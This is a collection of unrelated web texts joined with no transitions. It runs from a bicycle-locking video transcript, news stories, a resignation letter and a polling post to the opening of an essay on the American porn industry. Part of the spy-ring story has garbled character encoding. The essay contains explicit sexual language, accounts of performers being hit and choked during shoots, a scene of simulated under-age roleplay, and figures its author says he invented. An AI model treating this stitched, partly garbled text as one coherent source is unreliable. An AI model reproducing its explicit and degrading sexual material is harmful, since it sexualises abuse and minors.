Anybody with a cable cutter or wire cutter could cut this in a matter of 15 seconds .
</p><p>[ 5:10 ]
This lock is pretty bad .
It 's an OK auxiliary lock to lock a wheel to the frame , but to lock a whole bicycle ?
This bike is out of here .
So I give this locking job , D minus .
The only reason it got that high a grade is because the bike is a D minus .
</p><p>[ 5:30 ]
We got another A .
Let me show you why this bike gets an A .
Frame and front wheel to a lamp post , I doubt if anybody 's ever going to saw this lamp post down .
Rear wheel and frame locked to each other .
Seat locked .
This bike gets an A , this is the proper way of locking your bicycle .
Solid A.</p>< p>[ musical interlude ]
</p><p>Hal : [ 5:58 ]
You can ride on the sidewalk legally in any borough if you own three dogs and are riding with them at the same time .
</ p><p>[ 6:05 ]
I know the owner .
</ p>< p>Speaker : [ 6:07 ]
You know the owner of this bike ?
</p>< p>Hal : [ 6:08 ]
Yeah , he 's a nice guy .
</ p>< p>Speaker : [ 6:10 ]
OK , and now you 're going to critique him .
</p><p>Hal : [ 6:12 ]
Notice clamp , and a clamp here , and a clamp here and a chain , and a proper lock .
Still anybody , with a couple , in like less than a minute , you can take these wheels off .
There is deterrent , it 's not quick any more .
It 's a B , this bike gets a B.
</p><p>[ applause ]
</p><p>Hal : [ 6:37 ]
Locking your bicycle , a lot of times you 're just buying time and that 's important .
If you put enough locks on your bike where even if they 're not the most secure lock , it just takes a thief too long and he 'll give up and go on to the next bike , you know .
On this street , there are many next bikes .
</p><p>[ 6:56 ]
Now here , the rear wheel is n't locked but it will not get stolen because the thief would have to buy a new tire and tube because it 's flat .
In fact , here 's the nice piece of glass that gave him the flat .
</p>< p>Speaker : [ 7:07 ]
So Hal are you saying one deterrent for deterring , you can .
</p><p>Hal : [ 7:09 ]
One deterrent .
</p>< p>Speaker : [ 7:10 ]
You can .
</p><p>Hal : [ 7:12 ]
If you have a flat tire , the odds are it probably wo n't get stolen .
Because whoever the thief sells it to then has to fix it .
</ p><p>[ 7:19 ]
See it can be easily stolen , it 's not locked at all .
The front wheel again , easily stolen .
And the rear wheel easily stolen .
So this bike gets an F in locking .
[ buzzer ]
</ p>< p>Speaker : [ 7:33 ]
What would your grade for this bicycle be ?
</p><p>Hal : [ 7:36 ]
My grade ?
As far as this bike , what you 've locked up here , I give him an A because no one is ever going to steal this .
But the quality of locking is an F .
But , it 's like locking dog manure .
Whatever you use , no one 's going to take it and same here , this is just dog manure in the shape of a bicycle .
</ p><p>[ 8:00 ]
Hope you learned something from my little pointing stuff out and I hope you learned how to lock your bike , especially .
And , you get a good strong pole , decent locks , lock your wheel , lock your seat and have a crappy enough bike , you get an A .
And all right , on that point , you have a nice day now .
Bye - bye now .

( Newser ) – The Rolling Stones are planning a 50th - anniversary tour that will also serve as a farewell tour , the Daily Mail reports .
" They want to bow out on top of their game , and not short - change their fans , " a source says of Mick Jagger , Keith Richards , Charlie Watts , and Ronnie Wood — whose combined age will be 268 when the tour launches next year ..
The tour will wrap up in 2012 , 50 years and 200 million albums sold after the band was formed — and 41 years after their first farewell tour .

When you take a breath of air , it embarks on a complicated journey , beginning at the base of the tree 's stump and moving downward through increasingly smaller branches , eventually ending up in the leaves .
But instead of leaves , there are tiny air sacs called alveoli , of which each lung contains millions .
Wrapped around the alveoli are miniature blood vessels called capillaries .
The intersection between each alveolus and its capillaries is extremely important .
First of all , it 's the site of gas exchange , the critical process in which oxygen from the lungs is traded for carbon dioxide from the blood .
But its also an avenue for the two - way transport , between the lungs and the rest of the body , of fluids , immune cells , nutrients and other chemicals , including drugs and environmental toxins .
Understanding how this complex , microscopic intersection works is a big goal in biomedical engineering .
It could lead to improved methods for testing drugs that enter the body through the respiratory system , and help reveal how our lungs deal with nanoparticles , which are becoming increasingly popular ingredients in consumer products like crack - resistant paints , stain - repellent fabrics and cosmetics .
Now , researchers say they have built a realistic model of the alveolar - capillary boundary , using real human lung and vascular cells to simulate the life - like interaction of two different organ tissues for the first time .
In recent years , scientists have made gains in recreating precise real - life physiological conditions that affect tissue behavior .
Using techniques originally invented to make microscopic etchings in computer chips , various research groups have created miniature 3D models of blood vessels , muscle and other organ tissues .
In 2007 , a group at the University of Michigan modeled the lungs ' tiniest airways , carving microscopic channels , which were used to simulate real - life fluid and air flow , into an elastic material called polydimethylsiloxane ( PDMS ) .
The biomedical community called the device a lung - on - a- chip .
These models are limited , however , since they involve only a single tissue , while real organs usually contain multiple tissues that collaborate to perform unique functions .
But now , researchers led by Donald Ingber , the director of Harvard University 's Wyss Institute for Biologically Inspired Engineering , have taken the lung - on - a - chip one step further , creating the first device to demonstrate the interaction of two separate tissues , in this case respiratory and vascular .
The model is also the first to incorporate the rhythmic pressure changes that occur in our chests as we breathe .
" Some people have put different cell types next to each other to look at transfer of chemicals and hormones .
But what we 've done is to basically have a tissue–tissue interface , and we 've added the physical microenvironment that is so critical for tissue function , " Ingber says .
To replicate the alveolus - capillary barrier , Dongeun Huh , a biomedical engineer at Harvard , created two microscopic channels in a tiny chamber of PDMS .
A 10 - micron - thick ( a micron is a millionth of a meter ) porous barrier separates the two channels .
The researchers grew human cells on both sides of that barrier , placing alveolar tissue on one side and vascular tissue on the other .
Huh and his colleagues then ran fluid through the vascular channel to simulate continuous blood flow through the capillaries , and flowed air through the alveolar side , mimicking real - life conditions in the lung .
The researchers simulated life - like breathing by applying vacuum pressure to adjacent chambers on both sides of the tissue - containing chamber .
Reducing the pressure to sub-atmospheric levels , which is what happens when we inhale , caused the tissues in the device to stretch .
This stretching is neglected in traditional cell cultures used for drug testing , Ingber says , even though it is vital to the system .
" Breathing all the time affects the viability and function of the organ , similar to how tension on muscle affects muscle growth , as we all know from lifting weights , " he explains .
With this model , critical interactions between two organ tissues can be observed in real time , another reason future iterations could be useful in research and in medicine .
" It 's really easy to image and look at , so you can tell what 's going on — something you could n't do very easily if you actually tried to look in the lung itself , in a body , " says Shuichi Takayama , a biomedical engineering professor at the University of Michigan .
Takayama helped pioneer the lung - on - a - chip concept , but was not part of this study .
Ingber says the next step is to identify the specific needs in the biomedical and pharmaceutical industries .
Then , he says , the device could take several forms -— it 's low - cost , can be mass - produced , and one day could even be personalized with a patient 's own cells , which could be crucial for patients with specific lung conditions .
" If we could shortcut the need for animal studies , use human cells and get organ - level type functionality , " he says , " that could be huge savings of time and money . "

A 21 - year - old Oakland man is in police custody after he threw his baby daughter into the path of a moving car , according to cops .
Police say an off - duty officer saw the man , later identified as John Taylor , shake the 18 - month girl and throw her into oncoming traffic on Fifth Avenue near East 15th Street around 5:39 p.m. Saturday .
A Volkswagen Jetta almost hit the toddler , police say , and the car 's undercarriage burned and scraped the girl .
The girl , Jayla , lives with her mother and had been visiting with her father that day .
After Taylor allegedly threw his baby daughter into the lane of traffic , he took off running , pounding on and kicking cars along the way , police said .
While a neighbor pulled the baby girl out from underneath the Jetta , police chased Taylor down .
The girl 's mother , Alena Bartholemew , does n't believe the story .
She says Taylor was under attack and did what he could to protect their baby .
" I 'm hurting now because I know my baby 's father is in jail facing charges and I do n't feel that it is reasonable , " Bartholemew told NBC Bay Area .
" Anybody who feels that they think that John had thrown the baby out , please get that out your mind -- there is no reason to believe that .
He is a great father to her . "
Drivers in the neighborhood tried to stop Taylor as he ran from cops .
When officers caught up with him , they found him in a violent scuffle with those motorists .
Police hit Taylor with a Taser and arrested him .
Taylor was arrested on suspicion of of willful cruelty to a child , vandalism , resisting arrest and battery on a police officer .
I turned in my notice today in the form of a beautifully sculpted fuck you letter to my bosses .
Much in the same way you buy a lottery ticket more for the ability to dream about winning , I wrote this letter so I could dream about what their faces would look like when they read it .
For your reading pleasure ( names have been changed to protect the stupid ) :
Dear Tweedle dum and Tweedle dee ,
I wish to hand in my notice as of today .
My reasons for this resignation are entirely due to the working conditions , lack of support , business practices , and unreasonable expectations I have experienced whilst working here .
Having worked here for over a year now , I feel I can accurately reflect on my experience here .
The final slap in the face was yesterday when you , Tweedle dee , would n’t walk over 2 minutes to witness for yourself the state of your own store .
From my initial interview I was led to believe that this company is there to support their staff .
I remember being told to run the business as I would see fit , if I needed any help or advice you would all be there .
I was told in the beginning that a bonus structure was in place based on sales targets , labour costs , food costs , and mystery shoppers .
I was also told there was room to advance .
Unfortunately , in the year or so I ’ve been at here none of these things have come true .
I also remember you , Tweedle dee , refering to my writing career as a ‘ blip on the radar . ’
I have never forgotten that comment .
I have never forgiven that comment .
That blip has been my dream since I was a child .
Through clenched teeth I responded that yes , of course catering has always been my dream , why on earth would I want to write for a living when I could make sandwiches for you ?
I ca n’t wait for the day you are merely a blip on my radar .
From the beginning , I was confused to whom I directly answered to .
It seemed that Asst Man was my direct contact for any issues I was having with the store , even though at the time he was simply a field consultant .
I was put in the middle of office politics many , many times :
Tweedle dum telling me to write an email to Asst Man acting as though I was upset by his tone and actions towards me though I had no issue .
Being told to go behind Asst Man ’s back in regards to store maintenance issues and other issues .
Sound confusing ?
It was .
I even brought this issue up at our last manager ’s meeting .
Who is my direct boss ?
I still do n’t know .
I appreciate people who are upfront with me and do n’t dance around the issues .
Apparently I ’m ‘ bad ’ at paperwork .
Has anyone ever called me up and explained what I ’m doing wrong ?
No .
Apparently my store is filthy .
Why is it never mentioned on any evaluation , inspection , or safety check ?
A few months ago Dickhead took photos around my store as ‘ evidence ’ and again this weekend , Tweedle dum did the same .
Will these ever be directly addressed ?
No .
On a side note , the staff room does have clothes strewn about because my staff have to share uniforms .
That ’s right .
I ca n’t even get enough uniforms for my staff so we have to swap them after each shift .
How ’s that for health and safety ?
What has frustrated me to no end is the lack of communication .
If you ever had a problem with me , pick up the phone and speak to me .
If you ever had a problem with the way I was running your store , you just had to talk to me .
If you wanted to know how taking away XY or Z might affect sales , you simply had to ask me .
Instead , gossip reigns supreme and I only hear of your disappointment 3rd or 4th hand .
Going along with this lack of communication issue , I understand you ’ve been having money issues .
I would understand this better if you could tell this to me straight .
Instead , I find out when my microwave breaks and I ’m told we do n’t have enough money for a callout .
I find out when I ask to promote someone to team leader and am told we do n’t have enough money for a 10 pence pay increase .
Here is how the situation has gone several times in the past :
1. Something breaks
2 . I call to get it fixed , find I have to pay a call out charge .
3. Call Asst Man to pay for it .
4 . Find out that we do n’t have enough money to fix it .
5 . At some point one of you comes into the store and is surprised to see something broken , you then tell me to fix it .
6 . I call Asst Man and am told again we do n’t have enough money .
A bad situation , would n’t you agree ?
My sales have decreased because of constant price changes and a lack of external marketing in response to [ a better store ] opening down the street .
You can blame me all you want .
You can get a brand new manager in there and you will still have the same issues .
Your store is not highly regarded by the public because it has proven to be untrustworthy and inconsistent .
A lot of work will have to go into rebuilding their trust , good luck with that .
Tweedle dum has been a very inconsistent person to work for .
On several occasions he made references to my appearance saying that I was n’t ‘ looking pretty enough ’ or my hair or makeup was n’t as nice as usual .
I ’m sorry , but this is sexual harassment .
He has used vulgar language around my staff and even referred to one of them as being a ‘ Russian spy . ’
Beyond making her feel uncomfortable , she ’s not even Russian !
He has been unprofessional and made my staff feel uncomfortable .
The constant price changes , translite orders , and marketing material changes have resulted in confusion in both staff and customers .
We do n’t know what promotion is on , how much a meal deal is , or what price a sandwich is ( if we ’re even selling it ) .
During our Christmas lunch when asked what we hoped to achieve over the next year , Tweedle dum interrupted with , “ Other than keeping your jobs . ’
This job is not worth all this .
While I know a manager ’s position is filled with more responsibility , it ’s ludicrous to expect someone to be on call all of the time .
I need time off .
I need the ability to call in ill .
I need a support structure in place that will allow me to take holiday that I am perfectly entitled to take .
I should not have to take phone calls on days off , nor should I have to come in when I ’m ill because I have no one else to cover me .
This is not poor management .
This is a lack of structure that could be fixed if pay increases were approved .
Every other operation has these systems in place .
For the record , it ’s hard to remain motivated when bonuses are never delivered , promotions are dangled like unattainable carrots , and new staff are brought in on higher salaries and I continue to be told there ’s no money for me .
It ’s hard to remain positive when there is no support in place to assist me .
It ’s hard to remain positive when all I feel is that you would rather see me fail and hire another manager than attempt to help the problem .
Perhaps heading development and running your own franchises is too much work and the stores are suffering .
I have experienced nothing but a lack of support on almost all levels .
I feel I have n’t had any support or communication from both head office and from my store ’s owners .
An example of this would be electing to go to a 24hour operation , or even extending the store hours , without consulting me .
I respect you are the owners and ultimately all decisions are yours , but when you first hired me you told me to run the store as if it were my own .
I have not been allowed to do that nor will I ever be if decisions are made over my head without my input .
I feel the staff here are overworked , underappreciated , and asked to do far too much in order to save money .
I have only been able to hang on as a manager here because my staff pick up the extra slack that an assistant manager , supervisor , or team leader should be doing .
They do this without extra pay , without extra thanks .
The fact that our store might be a little cluttered or not in the cleanest of states is because we are simply understaffed and not able to keep up .
I have problems with this because I refuse to break the law and operate my store illegally , unlike the manager before me .
My staff get one 5 minute break to sit down and eat every 8 hours .
Sound like EU regulation ?
The only person who has helped me tirelessly through my time here has been Asst Man .
He has worked so hard to keep me motivated and driven and I ’m sure I would n’t have survived this long without his help .
My only regret in turning in my notice is knowing that I ’m doubling his already ridiculous workload .
If there were some way to avoid that , I would .
I think he is the only thing holding these stores together right now , at a detriment to his own health .
I ’m quite a laidback person .
I have been quite flexible in regards to working hours , being ‘ on call ’ 24/7 and the huge amount of stress running a store like this involves .
I ’m also a very straight forward person .
I have tried to speak with both of you on several occasions about these issues and more .
It has become very obvious that there is no way to get my point across to either of you and I refuse to try any more .
This letter is mostly for my benefit , so I can leave knowing that I tried once more to tell you what has been happening .
I have watched as you place the blame at the foot of your own staff and I refuse to allow you to do that to me .
I have worked tirelessly for you for over a year now and I can see the eye of blame pointing towards me now that Manager 1 has left and Manager 2 has been fired .
Go ahead and blame me for the failings of your store .
Go ahead and condemn me for this letter .
I tell you what though , I ’m the only one in this organisation to actually say what everyone else is thinking .
Consider what blame you hold in this situation .
I quit .
Regards ,

This week ’s Essential Report comes in with the primaries running Coalition down 1 to 40 , ALP down 2 to 37 , washing out into a two party preferred of 52/48 to Labor – a one point Labor gain since last week .
The Greens are on 12 ( up 3 ) while the broad Others are steady on 10 .
This comes from a two week rolling sample of 1872 , giving us an MoE that maxes out around the 2.3 % mark .
This makes three pollsters showing a substantial jump in the Greens vote over the last fortnight – putting them somewhere around the 15 % mark at the moment .
Essential asked additional questions this week on which party has the best leadership team , awareness of actual asylum seeker numbers ( the results … ugh ! ) , advertising credibility on the RSPT and approval of John Howard as head of the International Cricket Council !
( if you ca n’t wait for that last question , just skip to the end of the post 😛 )
Thinking about the Government Ministers and the Opposition Shadow Ministers in Federal Parliament , who has the best leadership team – Kevin Rudd and the Labor Party or Tony Abbott and the Coalition ?
On the cross-tabs , Essential tells us :
95 % of Labor voters think the Labor team is better and 75 % of Liberal / National voters prefer the Liberal team .
Greens voters prefer the Labor team over the Liberal team ( by 55 % to 13 % ) , as do other party and independent voters ( 45 % to 24 % ) .
People aged under 35 prefer the Labor team 47 % to 18 % .
A rather chunky difference there between Labor and Liberal supporters and the perceptions of their respective teams leadership .
From what you have read and heard , what percentage of Australia ’s annual immigration intake are asylum seekers arriving by boat ?
Looking at the reality – in 2008 / 9 there was a total of 1033 asylum seekers that arrived by boat ( give or take a handful where definitions get tricky ) and settler arrivals of 158,021 .
So in the 2008 / 9 year it came to around 0.7 % as a percentage .
In the 2009 /10 year there have been 4916 people arrive by boat as of the 26th of May .
There ’s still a month left , so let ’s be generous on the upside and say that it might go up to 5500 if a small flotilla arrives this month .
The planned migration intake this year is 182,450 – the migration intake of 168,700 + the 13,750 in the humanitarian program .
This would make the proportion of boat people 3 % .
So let us be generous ( because we ’re generous sorts around here ) and say that those answering around 5 % and those answering less than 1 % are both in the ballpark – the former for what will probably be this year ’s result and the latter for the last year the data has been completed .
Tabling up the results , we get :
When 44 % of Coalition voters are off with the fairies on asylum seeker numbers , is it any wonder that Abbott and Morrison deliberately exploit that ignorance at every opportunity for their own base political advantage ?
.
Thinking about the proposed resources super profits tax and the current advertising by the Government and the mining companies , who is more believable ‐ the Government or the mining companies ?
On the cross-tabs , Essential tells us something very consistent with the gender gap we saw on the RSPT in today ’s Nieslen :
There is a significant difference in opinion by gender – men are more likely to believe the Government ( Govt .
41 %/ Mining cos. 36 % / Do n’t know 24 % ) and women more likely to believe the mining companies or say they do n’t know ( 26%/35%/38 % ) .
.
Do you approve or disapprove of the former Prime Minister John Howard becoming head of the International Cricket Council ?
On the cross -tabs we get :
57 % of women and 60 % of people aged under 35 have no opinion .
Men approve 35 % to 22 % .

The owner of Geno's Steaks has gone from welcoming only English - speakers to his cheesesteak joint to actively raising money in support of Arizona 's anti-illegal alien initiatives .
“ I ’m not in favor of rounding people up and deporting them , but until we have control of the borders , there can be no compromise on this issue , ” said Dom Giordano , 1210 's Big Talker , who hosted a four - hour on - air fundraiser from Geno 's Steaks , reports the Metro .
The money raised will go toward aiding Arizona Gov. Jan Brewer 's fight against a federal lawsuit laid down by the Department of Justice saying that the controversial state law is unconstitutional .
The law , which allows police with " reasonable suspicion " to stop those they think are illegal , will begin July 29 .
Street protestors yelled and beat on drums to show their disapproval , raising signs with phrases like " Deport Geno 's " emblazoned across them .
" They 're not going to pull over an illegal Irish , " said Gonzalo Perez of West Philly , " Just brown people . "
" All those people across the street mocking us should get on a bus and leave , " Joey Vento , owner of Geno 's Steaks , told the Metro .
Vento , who gained attention nationwide for requiring his customers to order in English at his steakhouse , also added that the people protesting " hate " this country .
Pennsylvania is one of nine states backing Arizona in Federal Court and in a brief filed by Michigan 's Attorney General said that states should have the authority to enforce immigration laws and protect their borders .

Despite claims that the US military ’s private spy operation in Afghanistan and Pakistan has been shut down , the program continues to run and is feeding information to the Pentagon “ on an almost daily basis , ” the New York Times reported Saturday .
Additionally , the private operation has ballooned from its original goal of collecting general information about the war - torn region and is now carrying out potentially illegal covert spy operations , the Times states .
ADVERTISEMENT
In March , an investigative report by the Times uncovered the existence of a $ 22 - million contract to outsource the collection of intelligence about the tribal areas of Pakistan .
The news sparked controversy , with many observers concerned the US was handing over some of its most sensitive activities to private , unaccountable contractors .
According to that report , a US official identified as Michael Furlong organized a network of private contractors to run the intelligence operation .
The original contract , which was signed in early 2009 and tasked contractor Lockheed Martin with managing the project , allowed the private spy ring to gather “ atmospheric information ” — general , broad data about the political and social circumstances in the area .
But that original mandate appears to have been expanded into a full - scale intelligence - gathering and covert activities operation .
The Times reports :
The boundaries separating Ã¢â‚ ¬Å“ atmosphericsÃ¢â‚
¬Â from what spies gather is murky .
It is generally considered illegal for the military to run organized operations aimed at penetrating enemy organizations with covert agents .
[ D] efense officials with knowledge of the program said that contractors themselves regarded the contract as permission to spy .
Several weeks ago , one of the contractors reported on Taliban militants massing near American military bases east of Kandahar .
Not long afterward , Apache gunships arrived at the scene to disperse and kill the militants .
Defense Secretary Robert Gates announced a review of the program following its revelation in March .
A Pentagon official told the Times the review is still ongoing .
The paper reports it has been told the private spy ring will be shut down at the end of May , but there is speculation the Pentagon is dragging its feet on ending it because it finds the program ’s information useful .
ADVERTISEMENT
The private contractor network was born in part out of frustration with the CIA and the military intelligence apparatus .
There was a belief by some officers that the C.I.A. was too risk averse , too reliant on PakistanÃ¢â‚¬â „ ¢s spy service and seldom able to provide the military with timely information to protect American troops … .
The Times also raises concerns about Furlong , a civilian with ties to the military .
Furlong has “ a history of delving into outlandish intelligence schemes , including an episode in 2008 , when American officials expelled him from Prague for trying to clandestinely set up computer servers for propaganda operations , ” the Times reports .
In April , it was revealed that Furlong is under investigation for possibly having taken federal funds from an official program to study the situation in Afghanistan and Pakistan and used it to fund his covert spy ring .
ADVERTISEMENT
The use of private contractors in war zones has become a contentious issue .
While the use of security contractors such as Blackwater has been well documented , the Furlong spy ring appears to be the first documented case of a private , for - profit intelligence operation run for the US military .
Even some defense officials are worried about Ã¢â‚ ¬Å“ private citizens running around a war zone , trying to collect intelligence that was nÃ¢â‚¬â „ ¢t properly vetted for operations that were nÃ¢â‚¬â „ ¢t properly coordinated , Ã¢â‚ ¬Â the Times reports .

In February , Sen. Bernie Sanders ( I - VT ) and Rep. Jan Schakowsky ( D - IL ) introduced the “ Stop Outsourcing Security Act . ”
If passed , the act would force the United States to phase out its controversial use of private security contractors in war zones like Iraq and Afghanistan .

The technique is very simple , but clever and effective , giving eerie results like the one above .
That 's the legendary Marshal of the Soviet Union Georgy Zhukov .
In 1945 , he was commander of the Red Army 's 1st Belorussian Front , which took Berlin along with the 1st Ukranian Front ( the Soviet equivalents to the Western Army Groups ) .
He is looking at the camera , all serious , standing on the stairs of the Reichstag , surrounded by some of his lieutenants and a bunch of tourists .

Pussies are bullshit .
Do n't let them tell you any different .
" Answer me something , " I said to John Stagliano .
We were stepping out of the porno home - on to the porno patio with its porno pool .
This was Malibu .
Down the slope and beyond the road lay the Pacific Ocean ; but the Staglianos have no access to its porno shore , in the evening they can watch the porno sunset with its porno pink and mauve and blood - orange , and then linger awhile , perhaps , under a porno moon .
" Answer me something .
How do you account for the emphasis , not just in your . . . work but in the industry in general , how do you account for the truly incredible emphasis on anal sex ? "
After a minimal shrug and a minimal pause Stagliano said , " Pussies are bullshit . "
Now John was being obedient to the dictionary definition of " bullshit " which is nonsense intended to deceive .
With vaginal , Stagliano elaborated - well , here you have some chick chirruping away .
And the genuinely discerning viewer ( jack - knifed over his flying fist ) has got to be thinking :
Is this for real ?
Or is it just bullshit ?
With anal , on the other hand , the actress is obliged to produce a different order of response : more guttural , more animal .
As Stagliano quaintly puts it , " Her personality comes out . "
He goes on : " You want guys who can fuck really good and make the girls look more . . . virile . "
Virile of course , means manly ; but once again Stagliano is using the King 's English .
You want the girls to show you " their testosterone " .
The name of Rocco Siffredi , again and again , was wistfully and reverently conjured .
Rocco , the big - dorked Italian , and porno's premier buttbanger or assbuster ( to use the dialect of this tribe ) .
" Rocco has far more power in this industry than any actress , " said Stagliano , pleased to be pulling one back for the boys ( generally speaking , men are the also - rans of porno ) .
" I was the first to shoot Rocco .
Together we evolved toward rougher stuff .
He started to spit on girls .
A strong male - dominant thing , with women being pushed to their limit .
It looks like violence but it 's not .
I mean , pleasure and pain are the same thing , right ?
Rocco is driven by the market .
What makes it in today 's market place is reality . "
And assholes are reality .
And pussies are bullshit .
Features and gonzo
There are , at present , two types of mainstream American pornography : Features and Gonzo .
Features are sex films with some sort of claim to the ordinary narrative : characterisation , storyline .
" We do n't just show you people fucking , " said a Features executive .
" We show you why they 're fucking . "
These movies are allegedly aimed at the " couples market " .
Couples , it asserted , want to know why people are fucking .
I can give these couples a three word answer that will hold true in every case : for the money .
In Flashpoint ( Wicked Pictures ) , for instance , a bunch of porno stars are dressed up as firefighters .
As the film opens , we see the porno stars sliding down the pole and boarding the crimson firetruck .
An exploding car , a colleague ( not a porno star but an ageing extra ) falling in the line of duty .
There follows an insanely boring funeral , which includes the whole of the Lord 's Prayer and the slow and solemn furling , by a porno star , of the American flag .
Porno star Jenna grieves for the fallen extra .
After returning from the funeral she finds herself alone with another porno star dressed up as a firefighter .
He seeks to assuage her grief , so she gives him a blowjob plus full intercourse .
The next sex scene , which occurs about a millennium later , is also triggered by grief counselling .
Here a male porno star comforts two female porno stars , one of them anally . . .
After a while you begin to think that porno stars , despite being very bad at acting , are very good at acting in one particular only : they can keep a straight face .
But then humourlessness , universal and institutionalised humourlessness , is the lifeblood of porno .
Films like Flashpoint go out to the video stores and , in the soft version ( where the hard action is partly obscured by some stray object - a fireman 's hat , say , or a fireman 's boot ) , are sold to cable and to hotel chain franchises , and so on .
Features owes the humiliating fatuity of its conventions to an old legal precedent called the " Miller Test " .
Miller v California ( 1973 ) established that a dirty movie was obscene if it was " utterly " without social , literary , artistic , political or scientific " value " .
In juridical terms , the key word here , of course , is " utterly " and millions of dollars have been spent on its definition .
With a wife like Hillary , Bill Clinton could never be a true pal of porno , but he largely left it alone on First Amendment grounds .
Unlike his two predecessors , who systematically harassed the industry with confiscations , multiple prosecutions , fines , jail terms .
It 's a fair guess that porno never felt more gorgeously secure than when Clinton , in his second term , became in effect the porno president .
Now porno is tensed and braced forchanges .
It feared Gore .
It dreaded Bush .
Gonzo porno is also known as " wall - to - wall " .
It shows you people fucking without concerning itself with why they 're fucking .
There are no Lord 's Prayers , no furled American flags in Gonzo .
Features porno is much , much dirtier than it used to be , but Gonzo porno is gonzo : way out there .
The new element is violence .
Strength and Pain
I had lunch with Temptress ( Features ) .
I had lunch with Chloe ( Gonzo ) .
And the next day I joined Chloe on the set of Welcum To Chloeville .
My lunch with Temptress was a relatively sedate affair .
At first I was reminded of the time I interviewed Penny Baker , a Playboy Playmate of the Year : within a minute I had run out of questions .
Temptress , like Penny , seemed to be inhibited by the presence of a company executive - in this case Steve Orenstein of Wicked Pictures , for which she is a contract player .
But Temptress loosened up .
" Tell me , Temptress , " I said ( having apologised for the corniness and mild hostility of my inquiry ) , " what wo n't you do ? "
" I wo n't do anal , " said Temptress .
" They keep trying to coax me into it .
You know : ' Just a finger or a tongue .
Or just a little bit : just the tip . '
But I won't , I used not to do facials .
But I do them now . "
Temptress is not talking about beauty treatments .
She is talking about the destination of what is variously referred to as the " pop - shot " or the " money - shot " : the ejaculation of the male .
" What happens , " I asked , " when a co-star ca n't get hard ? "
The fiasco used to be the nemesis of porno .
A penile no - show could make the difference between profit and loss .
But the situation has been changed , I was told , thanks to Viagra .
On Viagra , the actor performs 45 minutes behind schedule , with a flushed face and a headache .
" You also lose a dimension , " John Stagliano would explain .
" The guy 's fucking without being aroused . "
He 's just " showing off " - and pretty soon you 're back to bullshit .
Another thing with Viagra is that the guy can have a problem with the pop-shot , thus endangering the facial .
" What do you do then , Temptress ? "
" You get some pina colada mix .
The cock 's in your mouth and you let it , like , ooze out around it . "
Physically Temptress reminded me of the daughters of my friends .
She did n't sound shy , but she looked it .
With her long straight hair frequently steered over her shoulders by her slow - moving hands , with her face unglazed by cosmetics , with her gently narrowed eyes , she exuded what Philip Larkin called the " strength and pain / Of being young " .
I asked about her history and she told me something of it .
And there was strength and there was pain ( and there was certainly youth : Temptress is 21 ) .
" But I do n't want you to write about that .
And could you not mention my real name ? . . .
I do n't have relationships any more .
They make life unstable .
The only sex I have is the sex on screen . "
Temptress is one of the lucky ones .
She 's a star .
After lunch I went to Wicked Pictures and had a talk with Jonathan Morgan ( performer turned director ) in a computerised cutting - room while he edited his latest Feature , a fantastically unfunny comedy called Inside Porn .
" Ah , " said Jonathan .
" Now here we have a double anal . "
A double anal is not to be confused with a DP ( double penetration : anal and vaginal ) .
A double anal is a double anal .
And there have been triple anals , too .
" The girls could be graded like A , B and C .
The A is the chick on the boxcover .
She has the power .
So she 'll show up late or not at all .
Ninety - nine point nine per cent of them do that . "
He gestured at the screen and said , " Here you have a borderline A/B doing a double anal .
Directors will remember that .
She 'll get phone calls .
For a double anal you 'd usually expect a B or a C .
They have to do the dirty stuff or they wo n't get a phone call .
You 've had a kid , you 've got some stretchmarks - you 're up there doing double anal .
" Some girls are used in nine months or a year .
An 18 - year - old , sweet young thing , signs with an agency , makes five films in her first week .
Five directors , five actors , five times five : she gets phone calls .
A hundred movies in four months .
She 's not a fresh face any more .
Her price slips and she stops
getting phone calls .
Then it's , ' Okay , will you do anal ?
Will you do gangbangs ? '
Then they 're used up .
They can't even get a phone call .
The market forces of this industry use them up . "
I thanked Jonathan Morgan for his candour .
But he was n't as candid as Chloe .
We met in the lobby of my hotel and we strolled out to her Mustang .
" See that ? "
The number plate said : STR82NL
" Straight to anal , " said Chloe .
And she had n't even got started .
Chloe was gonzo .
She gave me the truth .

A single issue of Adult Video News ( April 2000 ) yields the following .
Last October porno star Vivian Valentine attended the XXX - Treme Adults Only vacation in Mexico sporting the black eye she copped from Jon Dough on Rough Sex ( Anabolic Video ) .
" I have no regrets or bad feelings about it , " she said .
Regan Starr who worked on the second film in this " line " , Rough Sex 2 , had a different take .
" I got the shit kicked out of me , " she said .
" I was told before the video - and they said this very proudly , mind you - that in this line most of the girls start crying because they 're hurting so bad . . .
I could n't breathe .
I was being hit and choked .
I was really upset , and they did n't stop .
They kept filming .
You can hear me say , ' Turn the fucking camera off ' , and they kept going . "
The director of the Rough Sex series ( now discontinued ) , who goes by the name of Khan Tusion , protests his innocence .
" Regan Starr , " Tusion claims , " categorically misstates what occurred . "
If you do n't like Khan Tusion , you wo n't like Max Hardcore .
AVN 's regular " On the Set " column carries a cheerfully scandalised account of the making of Hollywood Hardcore 13 .
In this scene , actor - director Hardcore is having rough sex with Cloey Adams , who is pretending to be under age .
" If you 're a good girl , I 'll take you to McDonald 's later and get you a Happy Meal . "
Hardcore then " proceeds to piss in her mouth " .
Addressing the camera , Cloey Adams says , " What do you think of your little princess now Daddy ? "
Nor is Hardcore through with her .
" Turning to the crew , he calmly says , ' I 'll need a speculum and a hose ' . . .
One of Max 's favourite tricks is to stretch a girl 's asshole with a speculum , then piss into her open gape and make her suck out his own piss with a hose .
Ain't that romantic ? "
Now .
American porno ( and how could it be otherwise ? ) is market - driven .
We can see what the above tells us about porno .
But what does it tell us about America ?
And if America is more like a world than a country , what does it tell us about the world ?
 The average American spends three hours and 51 minutes of every day watching porno ( video and internet ) .
 The average non-homeowning American male spends more on porno than he spends on his rent .
 Porno accounts for 43.5 % of the US Gross Domestic Product .
Like pussies , these statistic are bullshit .
I made them up .
But the true figures are similarly wild , similarly dizzying , similarly through - the - roof .
This is n't bullshit .
 Porno is far bigger than rock music and far bigger than Hollywood .
 Americans spend more on strip clubs than they spend on theatre , opera , ballet , jazz and classical concerts combined .
 In 1975 the total retail value of all the hard - core porno in America was estimated at $ 5 - 10 million .
Last year Americans spent $ 8 billion on mediated sex .
Whatever porno is , whatever porno does , you may regret it , but you can not reject it .
To paraphrase Falstaff : Banish porno , and you banish all the world .
Chloe
" I have herpes , " said Chloe as she drove me to a smoker - friendly bar .
" After you 've been in this business for a while , you have herpes .
Everyone has herpes .
On the set sometimes you 'll say to a guy , ' What 's this ? '
And he 'll say , ' What ?
That ?
It 's a fuck sore . '
And it may well be a fuck sore , what with all the traffic .
